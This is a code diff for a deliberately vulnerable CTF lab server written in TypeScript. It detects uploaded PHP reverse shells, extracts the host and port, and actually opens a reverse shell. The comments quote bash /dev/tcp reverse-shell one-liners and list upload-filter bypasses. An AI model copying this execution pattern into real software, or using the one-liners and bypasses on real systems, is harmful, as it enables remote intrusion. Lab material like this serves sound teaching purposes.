@@ -56,8 +56,159 @@ function hasPhpCodeInContent(content: string): boolean {
 }
 
 /**
+ * VULNERABILIDAD: Extracción automática de IP y Puerto de código PHP
+ * 
+ * Esta función analiza el contenido de archivos PHP para extraer automáticamente
+ * la IP y puerto de destino de reverse shells. Soporta múltiples patrones comunes
+ * encontrados en herramientas como revshells.com.
+ * 
+ * PATRONES SOPORTADOS (en orden de prioridad):
+ * 1. Literales en fsockopen() - ej: fsockopen("192.168.1.100", 4444)
+ * 2. Bash /dev/tcp en exec/system/shell_exec - ej: exec('bash -i >& /dev/tcp/IP/PORT 0>&1')
+ * 3. Variables PHP - ej: $ip = '192.168.1.100'; $port = 4444;
+ * 4. Constructores de clases - ej: new Shell('192.168.1.100', 4444)
+ * 5. Propiedades de clase - ej: private $addr = '192.168.1.100';
+ * 
+ * EDUCATIONAL PURPOSE: Esta función demuestra cómo un servidor vulnerable
+ * puede detectar y ejecutar automáticamente código malicioso.
+ * 
+ * @param content - Contenido del archivo PHP
+ * @returns {host: string, port: number} | null
+ */
+function extractHostAndPort(content: string): { host: string; port: number } | null {
+  // ============================================================
+  // PATRÓN 1: Literales en fsockopen()
+  // Detecta: fsockopen("192.168.1.100", 4444)
+  //          fsockopen('192.168.1.100', 4444)
+  // Este es el patrón más directo y tiene prioridad máxima
+  // ============================================================
+  const fsockopenLiteralIp = content.match(/fsockopen\s*\(\s*["']([^"']+)["']/);
+  const fsockopenLiteralPort = content.match(/fsockopen\s*\([^,]+,\s*(\d+)/);
+  
+  if (fsockopenLiteralIp && fsockopenLiteralPort) {
+    return {
+      host: fsockopenLiteralIp[1],
+      port: parseInt(fsockopenLiteralPort[1])
+    };
+  }
+
+  // ============================================================
+  // PATRÓN 2: Bash /dev/tcp en exec/system/shell_exec/passthru
+  // Detecta one-liners muy comunes en reverse shells:
+  //   exec('bash -i >& /dev/tcp/192.168.1.100/4444 0>&1')
+  //   system('bash -c "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"')
+  //   shell_exec('/bin/bash -i > /dev/tcp/192.168.1.100/4444 0>&1')
+  //   passthru('bash -i >& /dev/tcp/192.168.1.100/4444 0>&1')
+  // ============================================================
+  const devTcpMatch = content.match(/\/dev\/tcp\/([^\s\/]+)\/(\d+)/);
+  if (devTcpMatch) {
+    return {
+      host: devTcpMatch[1],
+      port: parseInt(devTcpMatch[2])
+    };
+  }
+
+  // ============================================================
+  // PATRÓN 3: Variables PHP (muy común en revshells.com)
+  // Detecta asignaciones de variables para IP/host:
+  //   $ip = '192.168.1.100';
+  //   $host = "10.10.10.10";
+  //   $lhost = '192.168.1.100';
+  //   $addr = "192.168.1.100";
+  //   $rhost = '192.168.1.100';
+  // Y para puerto:
+  //   $port = 4444;
+  //   $lport = 9001;
+  //   $rport = 4444;
+  // 
+  // Nota: Las variables pueden tener diferentes nombres según el generador
+  // de shells usado (PentestMonkey, Ivan Sincek, etc.)
+  // ============================================================
+  
+  // Regex para variables de IP/host (con comillas simples o dobles)
+  const ipVarNames = ['ip', 'host', 'lhost', 'addr', 'rhost', 'address', 'target'];
+  const ipVarPattern = new RegExp(
+    `\\$(?:${ipVarNames.join('|')})\\s*=\\s*["']([^"']+)["']`,
+    'i'
+  );
+  const ipVarMatch = content.match(ipVarPattern);
+
+  // Regex para variables de puerto (número entero)
+  const portVarNames = ['port', 'lport', 'rport', 'p'];
+  const portVarPattern = new RegExp(
+    `\\$(?:${portVarNames.join('|')})\\s*=\\s*["']?(\\d+)["']?`,
+    'i'
+  );
+  const portVarMatch = content.match(portVarPattern);
+
+  if (ipVarMatch && portVarMatch) {
+    return {
+      host: ipVarMatch[1],
+      port: parseInt(portVarMatch[1])
+    };
+  }
+
+  // ============================================================
+  // PATRÓN 4: Constructores de clases
+  // Detecta shells orientadas a objetos como Ivan Sincek shell:
+  //   new Shell('192.168.1.100', 4444)
+  //   new ReverseShell('192.168.1.100', 4444)
+  //   new Reverse("192.168.1.100", 4444)
+  //   new Socket('192.168.1.100', 4444)
+  // ============================================================
+  const classConstructorMatch = content.match(
+    /new\s+(?:Shell|ReverseShell|Reverse|Socket|RevShell|Connection)\s*\(\s*["']([^"']+)["']\s*,\s*(\d+)/i
+  );
+  if (classConstructorMatch) {
+    return {
+      host: classConstructorMatch[1],
+      port: parseInt(classConstructorMatch[2])
+    };
+  }
+
+  // ============================================================
+  // PATRÓN 5: Propiedades de clase (public/private/protected)
+  // Detecta definiciones de propiedades en clases PHP:
+  //   private $addr = '192.168.1.100';
+  //   private $port = 4444;
+  //   public $host = '192.168.1.100';
+  //   protected $ip = '192.168.1.100';
+  // ============================================================
+  const classPropIpPattern = new RegExp(
+    `(?:private|public|protected)\\s+\\$(?:${ipVarNames.join('|')})\\s*=\\s*["']([^"']+)["']`,
+    'i'
+  );
+  const classPropPortPattern = new RegExp(
+    `(?:private|public|protected)\\s+\\$(?:${portVarNames.join('|')})\\s*=\\s*["']?(\\d+)["']?`,
+    'i'
+  );
+  
+  const classPropIpMatch = content.match(classPropIpPattern);
+  const classPropPortMatch = content.match(classPropPortPattern);
+
+  if (classPropIpMatch && classPropPortMatch) {
+    return {
+      host: classPropIpMatch[1],
+      port: parseInt(classPropPortMatch[1])
+    };
+  }
+
+  // No se encontró ningún patrón reconocido
+  return null;
+}
+
+/**
  * VULNERABILIDAD: Función de ejecución de reverse shell
  * Extrae IP y puerto del código PHP y ejecuta reverse shell con Node.js
+ * 
+ * Esta función utiliza extractHostAndPort() para detectar automáticamente
+ * la configuración de reverse shells en múltiples formatos, permitiendo
+ * que shells descargadas directamente de revshells.com funcionen sin modificación.
+ * 
+ * BYPASSES SOPORTADOS:
+ * - Bypass 1: Doble extensión (shell.php.jp2)
+ * - Bypass 2: Content-Type spoofing (shell.php con header image/jp2)
+ * - Bypass 3: Magic bytes (JP2 magic bytes + código PHP)
  * 
  * Returns:
  * - { executed: true } if reverse shell was initiated
@@ -66,14 +217,14 @@ function hasPhpCodeInContent(content: string): boolean {
  */
 function executeReverseShell(content: string, request: NextRequest): { executed: boolean } | NextResponse {
   try {
-    // Buscar patrón de reverse shell en el contenido
-    // Patrón para fsockopen("host", port) o fsockopen('host', port)
-    const ipMatch = content.match(/fsockopen\s*\(\s*["']([^"']+)["']/);
-    const portMatch = content.match(/fsockopen\s*\([^,]+,\s*(\d+)/);
+    // Extraer IP y puerto del contenido PHP usando detección multi-patrón
+    const hostPort = extractHostAndPort(content);
     
-    if (ipMatch && portMatch) {
-      const host = ipMatch[1];
-      const port = parseInt(portMatch[1]);
+    if (hostPort) {
+      const { host, port } = hostPort;
+      
+      // Log para debugging en laboratorio CTF (educativo)
+      console.log(`[REVERSE SHELL] Detected - Host: ${host}, Port: ${port}`);
       
       // Iniciar reverse shell con Node.js
       const client = new net.Socket();
